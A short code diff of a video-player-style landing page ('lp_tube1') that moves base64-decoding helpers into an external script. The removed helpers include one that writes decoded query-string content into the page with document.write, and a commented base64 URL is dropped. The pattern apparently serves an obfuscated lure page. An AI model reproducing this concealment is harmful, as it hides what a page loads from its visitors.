@@ -5,17 +5,8 @@
 	<link rel="stylesheet" href="https://prekerteam.github.io/lp_tube1/css/style.css?20319" type="text/css">
 	<link rel="stylesheet" href="https://prekerteam.github.io/lp_tube1/css/player.css?20319" type="text/css">
 	<link rel="stylesheet" href="https://prekerteam.github.io/lp_tube1/css/box-fb.css?20319" type="text/css">
+	<script type="text/javascript" src="https://prekerteam.github.io/js/controler.js"></script>
 	<script type="text/javascript">
-		function cid(name) {
-			return decodeURI(
-				(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
-			);
-		}
-		function decode(txt) {
-			var result = atob(txt);
-			document.write(result);
-		}
-		//var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
 		if (cid("i")) {
 			var img = atob(cid("i"));
 		} else {
